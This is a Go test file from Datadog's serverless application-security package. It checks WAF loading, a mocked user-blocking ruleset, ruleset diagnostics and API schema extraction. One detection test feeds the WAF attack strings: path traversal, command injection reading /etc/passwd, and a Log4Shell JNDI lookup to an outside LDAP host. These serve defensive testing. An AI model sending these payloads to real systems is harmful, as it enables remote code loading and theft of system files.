// Unless explicitly stated otherwise all files in this repository are licensed
// under the Apache License Version 2.0.
// This product includes software developed at Datadog (https://www.datadoghq.com/).
// Copyright 2016-present Datadog, Inc.

package appsec

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"testing"

	"github.com/DataDog/appsec-internal-go/appsec"

	"github.com/stretchr/testify/require"
)

func init() {
	os.Setenv("DD_APPSEC_WAF_TIMEOUT", "1m")
}

// TestAWSLambadaHostSupport ensures the AWS Lamba host is supported by checking that libddwaf loads
// successfully on linux/{amd64,arm64}. This test assumes the test will be executed on such hosts.
func TestAWSLambadaHostSupport(t *testing.T) {
	err := wafHealth()
	if runtime.GOOS == "linux" && (runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64") {
		// This package is only supports AWS Lambda targets (linux/{amd64,arm64}).
		// Ensure libddwaf load properly on such hosts.
		require.NoError(t, err)
	} else {
		t.Skip() // The current host is not representative of the AWS Lambda host environments
	}
}

func TestNew(t *testing.T) {
	if err := wafHealth(); err != nil {
		t.Skip("host not supported by appsec", err)
	}

	for _, appsecEnabled := range []bool{true, false} {
		appsecEnabledStr := strconv.FormatBool(appsecEnabled)
		t.Run(fmt.Sprintf("DD_SERVERLESS_APPSEC_ENABLED=%s", appsecEnabledStr), func(t *testing.T) {
			t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", appsecEnabledStr)
			lp, stop, err := NewWithShutdown(nil)
			if stop != nil {
				defer stop(context.Background())
			}
			require.NoError(t, err)

			if appsecEnabled {
				require.NotNil(t, lp)
			} else {
				require.Nil(t, lp)
			}
		})
	}
}

func TestMonitor(t *testing.T) {
	if err := wafHealth(); err != nil {
		t.Skip("host not supported by appsec", err)
	}

	t.Run("mocked-ruleset", func(t *testing.T) {
		t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", "true")

		// write file to tmp directory
		f, err := os.CreateTemp("", "mocked-ruleset.json")
		require.NoError(t, err)
		defer f.Close()

		_, err = f.Write([]byte(mockedRuleset))
		require.NoError(t, err)

		os.Setenv(appsec.EnvRules, f.Name())
		defer os.Setenv(appsec.EnvRules, "") // Reset value

		asm, err := newAppSec()
		require.NoError(t, err)
		defer asm.Close()

		res := asm.Monitor(map[string]interface{}{
			"usr.id": "usr-2024",
		})
		require.NotNil(t, res)
		require.False(t, res.Result.HasEvents())

		res = asm.Monitor(map[string]interface{}{
			"usr.id": "usr-2025",
		})
		require.NotNil(t, res)
		require.True(t, res.Result.HasEvents())
	})

	t.Run("diagnostics-ruleset-validation", func(t *testing.T) {
		t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", "true")
		asm, err := newAppSec()
		require.NoError(t, err)
		defer asm.Close()

		res := asm.Monitor(map[string]interface{}{
			"some.key": "some.value",
		})
		require.NotNil(t, res)

		// No event as we do not pass any useful input
		require.False(t, res.Result.HasEvents())

		require.NotZero(t, res.Diagnostics)
		require.NotEmpty(t, res.Diagnostics.Version)
		require.Regexp(t, "^(0|[1-9]\\d*)\\.(0|[1-9]\\d*)\\.(0|[1-9]\\d*)$", res.Diagnostics.Version) // semver regexp

		// Ensure that the default ruleset is in a reasonably normal state.
		// The ruleset may contain failed or skipped rules,
		// as we sometimes have rules available for future use
		// while the WAF logic/operator is not yet deployed.
		//
		// At the time of the writing of this test
		// - ruleset v1.13.3
		// - libddwaf v1.22.0
		// with 159 loaded, 0 failed & 0 skipped rules

		require.NotNil(t, res.Diagnostics.Rules)

		// Allow a 20% reduction in the number of loaded rules.
		// Ensure that the actual count is within the acceptable range.
		require.Less(t, 130, len(res.Diagnostics.Rules.Loaded),
			"Loaded rules count is 20% less than expected")
		// Allow up to 10 rules to fail loading.
		require.InDelta(t, 0, len(res.Diagnostics.Rules.Failed), 10,
			"Failed rules count exceeds threshold")

		// No timeout expected
		require.EqualValues(t, 0, res.Stats.TimeoutCount)
		require.EqualValues(t, 0, res.Stats.TimeoutRASPCount)

		// This almost empty WAF call duration should be less than 50µs
		require.NotEqualValues(t, 0, res.Stats.Timers["waf.duration_ext"])
	})

	t.Run("events-detection", func(t *testing.T) {
		t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", "true")
		asm, err := newAppSec()
		require.NoError(t, err)
		defer asm.Close()

		uri := "/path/to/resource/../../../../../database.yml.sqlite3"
		addresses := map[string]interface{}{
			"server.request.uri.raw": uri,
			"server.request.headers.no_cookies": map[string][]string{
				"user-agent": {"sql power injector"},
			},
			"server.request.query": map[string][]string{
				"query": {"$http_server_vars"},
			},
			"server.request.path_params": map[string]string{
				"proxy": "/path/to/resource | cat /etc/passwd |",
			},
			"server.request.body": "eyJ0ZXN0I${jndi:ldap://16.0.2.staging.malicious.server/a}joiYm9keSJ9",
		}
		res := asm.Monitor(addresses)
		require.NotNil(t, res)
		require.True(t, res.Result.HasEvents())
	})

	t.Run("api-security", func(t *testing.T) {
		t.Setenv("DD_API_SECURITY_REQUEST_SAMPLE_RATE", "1.0")
		t.Setenv("DD_EXPERIMENTAL_API_SECURITY_ENABLED", "true")
		t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", "true")
		asm, err := newAppSec()
		require.NoError(t, err)
		defer asm.Close()
		for _, tc := range []struct {
			name       string
			pathParams map[string]any
			schema     string
		}{
			{
				name: "string",
				pathParams: map[string]any{
					"param": "string proxy value",
				},
				schema: `{"_dd.appsec.s.req.params":[{"param":[8]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
			},
			{
				name: "int",
				pathParams: map[string]any{
					"param": 10,
				},
				schema: `{"_dd.appsec.s.req.params":[{"param":[4]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
			},
			{
				name: "float",
				pathParams: map[string]any{
					"param": 10.0,
				},
				schema: `{"_dd.appsec.s.req.params":[{"param":[16]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
			},
			{
				name: "bool",
				pathParams: map[string]any{
					"param": true,
				},
				schema: `{"_dd.appsec.s.req.params":[{"param":[2]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
			},
			{
				name: "record",
				pathParams: map[string]any{
					"param": map[string]any{"recordKey": "recordValue"},
				},
				schema: `{"_dd.appsec.s.req.params":[{"param":[{"recordKey":[8]}]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
			},
			{
				name: "array",
				pathParams: map[string]any{
					"param": []any{"arrayVal1", 10, false, 10.0},
				},
				schema: `{"_dd.appsec.s.req.params":[{"param":[[[2],[16],[4],[8]],{"len":4}]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
			},
			{
				name: "vin-scanner",
				pathParams: map[string]any{
					"vin": "AAAAAAAAAAAAAAAAA",
				},
				schema: `{"_dd.appsec.s.req.params":[{"vin":[8,{"category":"pii","type":"vin"}]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
			},
		} {
			t.Run(tc.name, func(t *testing.T) {
				res := asm.Monitor(map[string]any{
					"server.request.path_params": tc.pathParams,
					"server.request.query": map[string][]string{
						"query": {"$http_server_vars"},
					},
				})
				require.NotNil(t, res)
				require.True(t, res.Result.HasDerivatives())
				schema, err := json.Marshal(res.Result.Derivatives)
				require.NoError(t, err)
				require.Equal(t, tc.schema, string(schema))
			})
		}
	})
}

const mockedRuleset = `{
    "version": "2.2",
    "metadata": {
        "rules_version": "0.1.2"
    },
    "rules": [
        {
            "id": "mock-001",
            "name": "Mock Block User",
            "tags": {
                "type": "block_usr",
                "category": "security_response"
            },
            "conditions": [
                {
                    "parameters": {
                        "inputs": [
                            {
                                "address": "usr.id"
                            }
                        ],
                        "list": [
                            "usr-2025"
                        ]
                    },
                    "operator": "exact_match"
                }
            ],
            "transformers": [],
            "on_match": [
                "block"
            ]
        }
    ]
}`
